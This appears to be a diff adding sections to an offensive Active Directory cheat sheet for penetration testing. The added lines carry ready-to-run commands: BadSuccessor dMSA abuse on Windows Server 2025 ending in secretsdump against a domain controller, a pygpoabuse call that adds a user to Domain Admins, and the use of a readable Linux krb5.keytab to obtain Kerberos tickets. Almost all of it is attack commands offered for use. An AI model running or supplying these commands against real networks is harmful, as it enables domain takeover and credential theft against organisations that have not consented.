@@ -181,6 +181,40 @@ sudo responder -I <iface>
 hashcat -a0 -m5600 captured.NTLMv2-SSP <WORDLIST>
 ```
 
+BadSuccessor (Windows Server 2025 delegated Managed Service Accounts) — if you have Create-Child rights on *any* OU and GenericAll over the dMSA you create there, you can link it to any existing user and get the KDC to issue you a ticket carrying that user's full PAC, no password reset or ACL abuse on the target needed:
+```powershell
+New-ADComputer -Name <attacker-computer> -SamAccountName '<attacker-computer>$' -AccountPassword (ConvertTo-SecureString '<PW>' -AsPlainText -Force) -Enabled $true -Path '<writable-OU-DN>'
+New-ADServiceAccount -Name <dmsa-name> -DNSHostName '<dmsa-name>.<domain>' -CreateDelegatedServiceAccount -KerberosEncryptionType AES256 \
+  -PrincipalsAllowedToRetrieveManagedPassword '<attacker-computer>$' -Path '<writable-OU-DN>'
+# grant yourself GenericAll on the dMSA object (via Set-Acl or an ACL tool), then link it to the target to impersonate:
+Set-ADServiceAccount -Identity <dmsa-name> -Replace @{
+  'msDS-ManagedAccountPrecededByLink' = '<target-user-DN>'
+  'msDS-DelegatedMSAState' = 2
+}
+```
+```bash
+# get a TGT for your attacker computer account, then ask for a TGS for the dMSA (Rubeus does the dMSA-aware request)
+Rubeus.exe asktgs /targetuser:<dmsa-name>$ /service:krbtgt/<domain> /dmsa /opsec /ptt /outfile:ticket.kirbi /ticket:<computer-tgt>
+ticketConverter.py ticket.kirbi <dmsa>.ccache
+export KRB5CCNAME=<dmsa>.ccache
+secretsdump.py -k -no-pass <DC_FQDN>     # ticket now carries the linked target user's rights
+```
+Confirm exposure first with NetExec's `badsuccessor` module (`nxc ldap <DC> -u <USER> -p <PASS> -M badsuccessor`).
+
+GPO abuse via GenericWrite — add a scheduled-task/immediate-task to a GPO you can write, which runs as any account logging in under it (fast path to Domain Admins if the GPO links to a privileged OU):
+```bash
+pygpoabuse.py '<domain>/<USER>' -hashes :'<HASH>' -gpo-id '<GPO-GUID>' \
+  -command 'net user <u> <p> /add && net group "Domain Admins" <u> /add' -f
+```
+
+Readable Kerberos keytab — a leftover `/etc/krb5.keytab` on a Linux box joined to AD gives a direct TGT for whatever principal it holds, no password needed:
+```bash
+klist -k -t -K /etc/krb5.keytab          # confirms the principal name
+kinit -kt /etc/krb5.keytab '<Principal>@<REALM>'
+export KRB5CCNAME=/tmp/krb5cc_0
+nxc ldap <DC_FQDN> -u <principal> -k --use-kcache
+```
+
 Timeroasting — computer accounts can be hashed via unauthenticated SNTP (MS-SNTP), no creds needed at all; useful recon/cred-crack path on a DC with lots of machine accounts:
 ```bash
 nxc smb <DC_IP> -M timeroast                 # dumps RID:hash pairs
